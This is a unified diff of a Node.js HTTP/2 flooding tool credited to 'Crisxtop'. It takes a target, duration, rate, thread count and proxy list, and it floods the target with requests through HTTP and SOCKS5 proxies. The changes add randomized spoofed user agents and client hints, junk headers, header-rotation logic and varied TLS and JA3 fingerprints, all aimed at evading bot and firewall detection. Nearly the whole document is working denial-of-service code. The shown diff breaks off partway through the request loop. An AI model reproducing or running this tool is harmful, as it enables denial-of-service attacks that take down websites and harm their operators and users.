@@ -1,22 +1,13 @@
-
-/*
-    Storm (js v1.1)
-
-    Thank you for 900 members!
-
-    Released by Serena Lotus
-
-    Made by Crisxtop
-*/
-
 const net = require("net");
 const http2 = require("http2");
+const http = require('http');
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const dns = require('dns');
 const fetch = require('node-fetch');
 const util = require('util');
+const socks = require('socks').SocksClient;
 const crypto = require("crypto");
 const HPACK = require('hpack');
 const fs = require("fs");
@@ -25,49 +16,20 @@ const pLimit = require('p-limit');
 const v8 = require('v8');
 const colors = require("colors");
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
-
-
-function get_option(flag) {
-    const index = process.argv.indexOf(flag);
-    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
-}
-  
-const options = [
-    { flag: '--ratelimit', value: get_option('--ratelimit') },
-    { flag: '--cookie', value: get_option('--cookie') },
-];
-
-function enabled(buf) {
-    var flag = `--${buf}`;
-    const option = options.find(option => option.flag === flag);
-
-    if (option === undefined) { return false; }
-
-    const optionValue = option.value;
-
-    if (optionValue === "true" || optionValue === true) {
-        return true;
-    } else if (optionValue === "false" || optionValue === false) {
-        return false;
-    }
-    
-    if (!isNaN(optionValue)) {
-        return parseInt(optionValue);
-    }
-
-    if (typeof optionValue === 'string') {
-        return optionValue;
-    }
-
-    return false;
-}
 const ciphers = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
-
+function encodeSettings(settings) {
+    const data = Buffer.alloc(6 * settings.length);
+    settings.forEach(([id, value], i) => {
+        data.writeUInt16BE(id, i * 6);
+        data.writeUInt32BE(value, i * 6 + 2);
+    });
+    return data;
+}
 function encodeFrame(streamId, type, payload = "", flags = 0) {
     const frame = Buffer.alloc(9 + payload.length);
     frame.writeUInt32BE(payload.length << 8 | type, 0);
@@ -89,6 +51,15 @@ function randomIntn(min, max) {
      return elements[randomIntn(0, elements.length)];
  }
     
+  function randstr(length) {
+		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+		let result = "";
+		const charactersLength = characters.length;
+		for (let i = 0; i < length; i++) {
+			result += characters.charAt(Math.floor(Math.random() * charactersLength));
+		}
+		return result;
+	}
   function generateRandomString(minLength, maxLength) {
     const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
@@ -110,8 +81,19 @@ const shuffleObject = (obj) => {
                 keys.forEach(key => shuffledObj[key] = obj[key]);
                 return shuffledObj;
             };
+ function randnum(minLength, maxLength) {
+    const characters = '0123456789';
+    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+    const randomStringArray = Array.from({
+      length
+    }, () => {
+      const randomIndex = Math.floor(Math.random() * characters.length);
+      return characters[randomIndex];
+    });
+    return randomStringArray.join('');
+  }
     const cplist = [
-    "TLS_AES_128_CCM_8_SHA256",
+       "TLS_AES_128_CCM_8_SHA256",
   "TLS_AES_128_CCM_SHA256",
   "TLS_CHACHA20_POLY1305_SHA256",
   "TLS_AES_256_GCM_SHA384",
@@ -155,7 +137,7 @@ const secureOptions =
  crypto.constants.SSL_OP_SINGLE_DH_USE |
  crypto.constants.SSL_OP_SINGLE_ECDH_USE |
  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
-if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt --ratelimit true/false --cookie true/false `).rainbow; process.exit();}
+ if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt `); process.exit();}
  const secureProtocol = "TLS_method";
  const headers = {};
  
@@ -180,6 +162,29 @@ if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt 
  const parsedTarget = url.parse(args.target); 
  class NetSocket {
      constructor(){}
+ 
+     async SOCKS5(options, callback) {
+
+      const address = options.address.split(':');
+      socks.createConnection({
+        proxy: {
+          host: options.host,
+          port: options.port,
+          type: 5
+        },
+        command: 'connect',
+        destination: {
+          host: address[0],
+          port: +address[1]
+        }
+      }, (error, info) => {
+        if (error) {
+          return callback(undefined, error);
+        } else {
+          return callback(info.socket, undefined);
+        }
+      });
+     }
   HTTP(options, callback) {
      const parsedAddr = options.address.split(":");
      const addrHost = parsedAddr[0];
@@ -258,7 +263,7 @@ const RESTART_DELAY = 10;
 if (cluster.isMaster) {
     console.clear();
     console.log('HEAP SIZE:',v8.getHeapStatistics().heap_size_limit/(1024*1024))
-    console.log(`@needmoreloli`.bgRed), console.log(`[!] CRISXTOP`);
+    console.log(`@SENDMEMORESERVER`.bgRed), console.log(`[!] CRISXTOP`);
     console.log(`--------------------------------------------`.gray);
     console.log(`Target: `.red + process.argv[2].white);
     console.log(`Time: `.red + process.argv[3].white);
@@ -338,284 +343,58 @@ function taoDoiTuongNgauNhien() {
   
     return doiTuong;
   }
-  const getRandomChar = () => {
-    const chars = 'abcdefghijklmnopqrstuvwxyz';
-    const randomIndex = Math.floor(Math.random() * chars.length);
-    return chars[randomIndex];
-};
-    const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];
-const getRandomBrowser = () => {
-    const randomIndex = Math.floor(Math.random() * browsers.length);
-    return browsers[randomIndex];
-};
-const generateHeaders = (browser) => {
-    const fullVersions = {
-        brave: "90.0.4430.212",
-        chrome: "90.0.4430.212",
-        firefox: "88.0",
-        safari: "14.1",
-        mobile: "90.0.4430.212",
-        opera: "90.0.4430.212",
-        operagx: "90.0.4430.212"
-    };
+  function eko(minLength, maxLength) {
+  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+  const randomStringArray = Array.from({
+    length
+  }, () => {
+    const randomIndex = Math.floor(Math.random() * characters.length);
+    return characters[randomIndex];
+  });
+  return randomStringArray.join('-');
+}
+nodeii = getRandomInt(122,128)
 
-    
-    const secChUAFullVersionList = Object.keys(fullVersions)
-        .map(key => `"${key}";v="${fullVersions[key]}"`)
-        .join(", ");
-    
-
-cache = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "must-revalidate", "public", "private", "proxy-revalidate", "s-maxage=86400"];
-const versions = {
-    chrome: { min: 115, max: 124 },
-    safari: { min: 12, max: 16 },
-    brave: { min: 115, max: 124 },
-    firefox: { min: 99, max: 112 },
-    mobile: { min: 85, max: 105 },
-    opera: { min: 70, max: 90 },
-    operagx: { min: 70, max: 90 }
-};
-
-const platforms = [
-    // Windows
-    "Windows:Windows NT 11.0; Win64; x64", // Windows 11
-    "Windows:Windows NT 10.0; Win64; x64", // Windows 10
-    "Windows:Windows NT 6.2; Win64; x64", // Windows 8.1
-    "Windows:Windows NT 6.1; Win64; x64", // Windows 7
-    "Windows:Windows NT 10.0; ARM64", // Windows on ARM
-
-    // Linux
-    "Linux:X11; Ubuntu; Linux x86_64", // Ubuntu Linux
-    "Linux:X11; Fedora; Linux x86_64", // Fedora Linux
-    "Linux:X11; Arch Linux x86_64", // Arch Linux
-    "Linux:X11; CentOS; Linux x86_64", // CentOS Linux
-    "Linux:X11; Debian; Linux x86_64", // Debian Linux
-
-    // macOS
-    "macOS:Macintosh; Intel Mac OS X 13_0", // macOS Sonoma
-    "macOS:Macintosh; Intel Mac OS X 12_0", // macOS Monterey
-    "macOS:Macintosh; Intel Mac OS X 11_0", // macOS Big Sur
-    "macOS:Macintosh; M1 Mac OS X 12_0", // macOS Monterey on M1
-
-    // Android
-    "Android:Linux; Android 14; Pixel 8 Pro Build/UPH3.220920.003", // Pixel 8 Pro
-    "Android:Linux; Android 13; Samsung Galaxy S23 Build/TP1A.220624.014", // Samsung Galaxy S23
-    "Android:Linux; Android 12; OnePlus 9 Build/OPM1.210911.020", // OnePlus 9
-
-    // iOS
-    "iOS:iPhone; CPU iPhone OS 17_0 like Mac OS X", // iPhone 15
-    "iOS:iPad; CPU OS 17_0 like Mac OS X", // iPad Pro (10th Gen)
-    "iOS:iPhone; CPU iPhone OS 16_0 like Mac OS X", // iPhone 14
-    "iOS:iPad; CPU OS 16_0 like Mac OS X" // iPad Air (5th Gen)
-];
-
-
-const getPlatform = (browser) => {
-    const platformMap = {
-        chrome: "Windows",
-        safari: "macOS",
-        brave: "Linux",
-        firefox: "Linux",
-        mobile: "Android",
-        opera: "Linux",
-        operagx: "Linux"
-    };
-
-    const platformKey = platformMap[browser];
-    if (!platformKey) {
-        console.error(`No platform mapping found for browser: ${browser}`);
-        return null;
-    }
-
-    const matchingPlatforms = platforms.filter(platform => platform.startsWith(platformKey));
-    if (matchingPlatforms.length === 0) {
-        console.error(`No user agents found for platform: ${platformKey}`);
-        return null;
-    }
-
-    const randomIndex = Math.floor(Math.random() * matchingPlatforms.length);
-    return matchingPlatforms[randomIndex].split(":")[1];
-};
-
-const getVersion = (browser) => {
-    const versionRange = versions[browser];
-    if (!versionRange) {
-        console.error(`No version range found for browser: ${browser}`);
-        return null;
-    }
-    return Math.floor(Math.random() * (versionRange.max - versionRange.min + 1)) + versionRange.min;
-};
-
-const getRandomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
-
-const userAgents = {
-    chrome: `Mozilla/5.0 (${getPlatform(browser)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getVersion(browser)}.0.0.0 Safari/537.36`,
-    safari: `Mozilla/5.0 (${getPlatform(browser)}) AppleWebKit/537.36 (KHTML, like Gecko) Version/${getVersion(browser)} Safari/537.36`,
-    brave: `Mozilla/5.0 (${getPlatform(browser)}) AppleWebKit/537.36 (KHTML, like Gecko) Brave/${getVersion(browser)}.0.0.0 Safari/537.36`,
-    firefox: `Mozilla/5.0 (${getPlatform(browser)}) Gecko/20100101 Firefox/${getVersion(browser)}`,
-    mobile: `Mozilla/5.0 (${getPlatform(browser)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getVersion(browser)} Mobile Safari/537.36`,
-    opera: `Mozilla/5.0 (${getPlatform(browser)}) AppleWebKit/537.36 (KHTML, like Gecko) Opera/${getVersion(browser)}`,
-    operagx: `Mozilla/5.0 (${getPlatform(browser)}) AppleWebKit/537.36 (KHTML, like Gecko) Opera GX/${getVersion(browser)}`
-};
-const getSecChUaHeader = (browser) => {
-    const version = getVersion(browser);
-    if (!version) return null;
-
-    const fullVersion = `v="${version}.0"`;
-    switch (browser) {
-        case 'chrome':
-        case 'brave':
-        case 'opera':
-        case 'operagx':
-            return `"${browser.replace(/^./, str => str.toUpperCase())}";${fullVersion}, "Chromium";${fullVersion}`;
-        case 'firefox':
-            return `"Firefox";${fullVersion}`;
-        case 'safari':
-            return `"Safari";${fullVersion}`;
-        case 'mobile':
-            return `"Google Chrome";${fullVersion}`;
-        default:
-            return `"${browser.replace(/^./, str => str.toUpperCase())}";${fullVersion}`;
-    }
-};
-
-const secChUaMobile = browser === "mobile" ? "?1" : "?0";
-    const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
-    const accept = Math.random() < 0.5 ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" : "application/json";
-    const headersMap = {
-        brave: {
-            ":method": "GET",
-            ":authority": parsedTarget.host,
-            ":scheme": "https",
-            ":path": parsedTarget.path,
-            "sec-ch-ua": getSecChUaHeader.brave,
-            "sec-ch-ua-mobile": `${secChUaMobile}`,
-            "accept": `${accept}`,
-            ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
-            "Sec-Fetch-Site": "none",
-            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
-            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
-            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
-            "Pragma": "no-cache",
-            "user-agent": userAgents.brave,
-            "accept-encoding": `${acceptEncoding}`,
-            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
-        },
-        chrome: {
-            ":method": "GET",
-            ":authority": parsedTarget.host,
-            ":scheme": "https",
-            ":path": parsedTarget.path,
-            "sec-ch-ua": getSecChUaHeader.chrome,
-            "sec-ch-ua-mobile": `${secChUaMobile}`,
-            "accept": `${accept}`,
-            ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
-            "Sec-Fetch-Site": "none",
-            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
-            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
-            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
-            "Pragma": "no-cache",
-            "user-agent": userAgents.chrome,
-            "accept-encoding": `${acceptEncoding}`,
-            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
-        },
-        firefox: {
-            ":method": "GET",
-            ":authority": parsedTarget.host,
-            ":scheme": "https",
-            ":path": parsedTarget.path,
-            "sec-ch-ua": getSecChUaHeader.firefox,
-            "sec-ch-ua-mobile": `${secChUaMobile}`,
-            "accept": `${accept}`,
-            ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
-            "Sec-Fetch-Site": "none",
-            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
-            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
-            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
-            "Pragma": "no-cache",
-            "user-agent": userAgents.firefox,
-            "accept-encoding": `${acceptEncoding}`,
-            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
-        },
-        safari: {
-            ":method": "GET",
-            ":authority": parsedTarget.host,
-            ":scheme": "https",
-            ":path": parsedTarget.path,
-            "sec-ch-ua": getSecChUaHeader.safari,
-            "sec-ch-ua-mobile": `${secChUaMobile}`,
-            "accept": `${accept}`,
-            ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
-            "Sec-Fetch-Site": "none",
-            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
-            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
-            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
-            "Pragma": "no-cache",
-            "user-agent": userAgents.safari,
-            "accept-encoding": `${acceptEncoding}`,
-            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
-        },
-        mobile: {
-            ":method": "GET",
-            ":authority": parsedTarget.host,
-            ":scheme": "https",
-           ":path": parsedTarget.path,
-            "sec-ch-ua": getSecChUaHeader.mobile,
-            "sec-ch-ua-mobile": `${secChUaMobile}`,
-            "accept": `${accept}`,
-            ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
-            "Sec-Fetch-Site": "none",
-            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
-            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
-            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
-            "Pragma": "no-cache",
-            "user-agent": userAgents.mobile,
-            "accept-encoding": `${acceptEncoding}`,
-            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
-        },
-        opera: {
-            ":method": "GET",
-            ":authority": parsedTarget.host,
-            ":scheme": "https",
-           ":path": parsedTarget.path,
-            "sec-ch-ua": getSecChUaHeader.opera,
-            "sec-ch-ua-mobile": `${secChUaMobile}`,
-            "accept": `${accept}`,
-            ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
-            "Sec-Fetch-Site": "none",
-            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
-            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
-            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
-            "Pragma": "no-cache",
-            "user-agent": userAgents.opera,
-            "accept-encoding": `${acceptEncoding}`,
-            "accept-language": "ru,en-US;q=0.9,en;q=0.8",
-        },
-        operagx: {
-            ":method": "GET",
-            ":authority": parsedTarget.host,
-            ":scheme": "https",
-            ":path": parsedTarget.path,
-            "sec-ch-ua": getSecChUaHeader.operagx,
-            "sec-ch-ua-mobile": `${secChUaMobile}`,
-            "accept": `${accept}`,
-            ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
-             "Sec-Fetch-Site": "none",
-            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
-            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
-            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
-            "Pragma": "no-cache",
-            "user-agent": userAgents.operagx,
-            "accept-encoding": `${acceptEncoding}`,
-           "accept-language": "ru,en-US;q=0.9,en;q=0.8",
-        }
-    };
-
-    return headersMap[browser];
-};
-const browser = getRandomBrowser();
-const headers = generateHeaders(browser);
-      
+    const userAgent =`${generateRandomString(100, 400)}Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${nodeii}.0.0.0 Safari/537.36${getRandomInt(100, 99999)}`
+     cache = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "must-revalidate", "public", "private", "proxy-revalidate", "s-maxage=86400"];
+    const headers = {
+    ":method": "GET",
+    ":authority": parsedTarget.host,
+    ":scheme": "https",
+    ":path": parsedTarget.path,
+    ...shuffleObject({
+    "sec-ch-ua": `"Not)B;Brand";v="${getRandomInt(100, 99999)}", "Google Chrome";v="${nodeii}", "Chromium";v="${nodeii}"`,
+    "sec-fetch-site": "none",
+    ...(Math.random() < 0.4 ? { "cache-control": cache } : {}),
+    ...(Math.random() < 0.8 ? { "sec-ch-ua-mobile": "?0"} : {}),
+    ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
+    ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
+    ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br, cdnfly",
+    "sec-ch-ua-platform": "Brand-Windows-" + generateRandomString(5, 30) + "=" + generateRandomString(0,2),
+     }),
+     "user-agent": userAgent,
+    "upgrade-insecure-requests": "1",
+    "accept-language": "ru,en-US;q=0.9,en;q=0.8"
+}
+if( Math.random >= 0.5) {
+  headers = {
+      ...(Math.random() < 0.6 ?{["Junk-size-Selfish"+generateRandomString(1, 2)]: "zefr-"+generateRandomString(1, 2)}:{}),
+      ...(Math.random() < 0.6 ?{["HTTP-requests-with-unusual-HTTP-headers-or-URI-path"]: "RIFSK-"+generateRandomString(1, 2)}:{}),
+      ...(Math.random() < 0.3 ?{["Request-Coming-From-Known-bad-source" ]: "user-"+generateRandomString(1, 2)}:{}),
+      ...(Math.random() < 0.3 ?{["HTTP-requests-from-known-botnet"]: "zefr-"+generateRandomString(1, 2)}:{}),
+      ...(Math.random() < 0.3 ?{["RiskKILDNN-"+generateRandomString(1, 2)]: "RIFSK-"+generateRandomString(1, 2)}:{}),
+  }
+  }
+function getWeightedRandom() {
+    const randomValue = Math.random() * Math.random();
+    return randomValue < 0.25;
+}
+                        
+                        
+                      
 
 const proxyOptions = {
     host: parsedProxy[0],
@@ -643,24 +422,23 @@ Socker.HTTP(proxyOptions, async (connection, error) => {
         ecdhCurve: ecdhCurve,
         secureContext: secureContext,
         honorCipherOrder: false,
-        maxRedirects: 20,
         rejectUnauthorized: false,
-        minVersion: 'TLSv1.2',
-        maxVersion: 'TLSv1.3',
-        followAllRedirects: true,
+        secureProtocol: Math.random() < 0.5 ? 'TLSv1_3_method' : 'TLSv1_2_method',
         secureOptions: secureOptions,
         host: parsedTarget.host,
         servername: parsedTarget.host,
     };
     
-    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions, async () => {
+    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions, () => {
+    const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
     tlsSocket.allowHalfOpen = true;
     tlsSocket.setNoDelay(true);
     tlsSocket.setKeepAlive(true, 60000);
     tlsSocket.setMaxListeners(0);
 
 });
-async function generateJA3Fingerprint(socket) {
+
+function generateJA3Fingerprint(socket) {
     const cipherInfo = socket.getCipher();
     const supportedVersions = socket.getProtocol();
 
@@ -676,26 +454,23 @@ async function generateJA3Fingerprint(socket) {
 
     return md5Hash.digest('hex');
 }
-tlsSocket.on('secureConnect', async () => {
-    const ja3Fingerprint = await generateJA3Fingerprint(tlsSocket);
-    headers["ja3"] = ja3Fingerprint;
-});
 
-tlsSocket.on('error', (error) => {
+tlsSocket.on('connect', () => {
+    const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
 });
 
 
-    let clasq = {
+    let clasq = shuffleObject({
         ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
         ...(Math.random() < 0.5 ? { [getRandomInt(100, 99999)]: getRandomInt(100, 99999) } : {}),
         ...(Math.random() < 0.5 ? { headerTableSize: 65536 } : {}),
-        enablePush: true,
+        enablePush: false,
         enableConnectProtocol: false,
         ...(Math.random() < 0.5 ? { maxConcurrentStreams: 1000 } : {}),
         ...(Math.random() < 0.5 ? { initialWindowSize: 6291456 } : {}),
         ...(Math.random() < 0.5 ? { maxHeaderListSize: 262144 } : {}),
         ...(Math.random() < 0.5 ? { maxFrameSize: 16384 } : {})
-    };
+    });
 function incrementClasqValues() {
     if (clasq.headerTableSize) clasq.headerTableSize += 1;
     if (clasq.maxConcurrentStreams) clasq.maxConcurrentStreams += 1;
@@ -705,10 +480,11 @@ function incrementClasqValues() {
 }
 setInterval(function() {
         incrementClasqValues()
-      }, 10000);
+      }, 1);
 
+    
     let hpack = new HPACK();
-    hpack.setTableSize(4096);
+    hpack.setTableSize(65535);
     let client;
     
     const clients = [];
@@ -716,8 +492,8 @@ setInterval(function() {
         protocol: "https",
         createConnection: () => tlsSocket,
         "unknownProtocolTimeout": 10,
-        "maxReservedRemoteStreams": 4000,
-        "maxSessionMemory": 200,
+        "maxReservedRemoteStreams": 3000,
+        "maxSessionMemory": 250,
         settings : clasq,
         socket: tlsSocket,
     });
@@ -728,7 +504,7 @@ setInterval(function() {
     updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 65535)) + 65535, 0);
     client.on('remoteSettings', (settings) => {
         const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 65535)) + 65535;
-        client.setLocalWindowSize(localWindowSize + 10, 0);
+        client.setLocalWindowSize(localWindowSize, 0);
     });
     client.on('connect', () => {
     client.ping((err, duration, payload) => {
@@ -737,13 +513,14 @@ setInterval(function() {
 
     clients.forEach(client => {
     const intervalId = setInterval(() => {
-        async function sendRequests()  {
+        const sendRequests = async () => {
             const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
             
             
             
             
             const limit = pLimit(10);
+            let currenthead = 0;
 
 const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
 
@@ -751,12 +528,96 @@ const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(
 
 
 
-                         
+                         const updateHeaders = () => {
+                          currenthead += 1
+			                    if (currenthead == 1) {
+                            headers["sec-ch-ua"] = `${randomString}`;
+                        } else if (currenthead == 2) {
+                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
+                            headers["sec-ch-ua-mobile"] = `${randomString}`;
+                        } else if (currenthead == 3) {
+                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
+                            headers["sec-ch-ua-mobile"] = "?0";
+                            headers["sec-ch-ua-platform"] = `${randomString}`;
+                        } else if (currenthead == 4) {
+                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
+                            headers["sec-ch-ua-mobile"] = "?0";
+                            headers["sec-ch-ua-platform"] = `"Windows"`;
+                            headers["upgrade-insecure-requests"] = `${randomString}`;
+                        } else if (currenthead === 5) {
+                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
+                            headers["sec-ch-ua-mobile"] = "?0";
+                            headers["sec-ch-ua-platform"] = `"Windows"`;
+                            headers["upgrade-insecure-requests"] = "1";
+                        } else if (currenthead === 6) {
+                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
+                            headers["sec-ch-ua-mobile"] = "?0";
+                            headers["sec-ch-ua-platform"] = `"Windows"`;
+                            headers["upgrade-insecure-requests"] = "1";
+                            headers["accept"] = `${randomString}`;
+                        } else if (currenthead === 7) {
+                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
+                            headers["sec-ch-ua-mobile"] = "?0";
+                            headers["sec-ch-ua-platform"] = `"Windows"`;
+                            headers["upgrade-insecure-requests"] = "1";
+                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
+                            headers["sec-fetch-site"] = `${randomString}`;
+                        } else if (currenthead === 8) {
+                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
+                            headers["sec-ch-ua-mobile"] = "?0";
+                            headers["sec-ch-ua-platform"] = `"Windows"`;
+                            headers["upgrade-insecure-requests"] = "1";
+                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
+                            headers["sec-fetch-site"] = "none";
+                            headers["sec-fetch-mode"] = `${randomString}`;
+                        } else if (currenthead === 9) {
+                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
+                            headers["sec-ch-ua-mobile"] = "?0";
+                            headers["sec-ch-ua-platform"] = `"Windows"`;
+                            headers["upgrade-insecure-requests"] = "1";
+                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
+                            headers["sec-fetch-site"] = "none";
+                            headers["sec-fetch-mode"] = "navigate";
+                            headers["sec-fetch-user"] = `${randomString}`;
+                        } else if (currenthead === 10) {
+                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
+                            headers["sec-ch-ua-mobile"] = "?0";
+                            headers["sec-ch-ua-platform"] = `"Windows"`;
+                            headers["upgrade-insecure-requests"] = "1";
+                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
+                            headers["sec-fetch-site"] = "none";
+                            headers["sec-fetch-mode"] = "navigate";
+                            headers["sec-fetch-user"] = "?1";
+                            headers["sec-fetch-dest"] = `${randomString}`;
+                        } else if (currenthead === 11) {
+                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
+                            headers["sec-ch-ua-mobile"] = "?0";
+                            headers["sec-ch-ua-platform"] = `"Windows"`;
+                            headers["upgrade-insecure-requests"] = "1";
+                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
+                            headers["sec-fetch-site"] = "none";
+                            headers["sec-fetch-mode"] = "navigate";
+                            headers["sec-fetch-user"] = "?1";
+                            headers["sec-fetch-dest"] = "document";
+                            headers["accept-encoding"] = `${randomString}`;
+                        } else if (currenthead === 12) {
+                            headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
+                            headers["sec-ch-ua-mobile"] = "?0";
+                            headers["sec-ch-ua-platform"] = `"Windows"`;
+                            headers["upgrade-insecure-requests"] = "1";
+                            headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
+                            headers["sec-fetch-site"] = "none";
+                            headers["sec-fetch-mode"] = "navigate";
+                            headers["sec-fetch-user"] = "?1";
+                            headers["sec-fetch-dest"] = "document";
+                            headers["accept-encoding"] = "gzip, deflate, br, zstd";
+                            currenthead = 0;
+                        }
+                        };
             let dynHeaders = shuffleObject({
                     ...taoDoiTuongNgauNhien(),
                     ...taoDoiTuongNgauNhien(),
                 });
-                
                 const head = {
                     ...dynHeaders,
                     ...headers,
@@ -765,44 +626,33 @@ const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(
             
 
             
+            const requests = [];
             let count = 0;
-            let ratelimit = [];
-            const filterRateLimit = (ratelimit) => {
-            const currentTime = Date.now();
-            return ratelimit.filter(limit => currentTime - limit.timestamp <= 60000);
-};
+
             
-                            const increaseRequestRate = async (client, head, args) => {
-                                if (!tlsSocket || tlsSocket.destroyed || !tlsSocket.writable) return;
-                                ratelimit = filterRateLimit(ratelimit);
-                                
-                                    const requests = [];
+
+            
+            
+                            const increaseRequestRate = async (client, dynHeaders, args) => {
+                                if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
+                                    const requests = []; // Luu tr? t?t c? các promise c?a request
                             
                                     for (let i = 0; i < args.Rate; i++) {
-                                    
-                                    const priorityWeight = Math.floor(Math.random() * 256); 
+                                    updateHeaders();
                                         const requestPromise = limit(() => new Promise((resolve, reject) => {
                                             const req = client.request(head, {
-                                                weight: priorityWeight,
+                                                weight: 256,
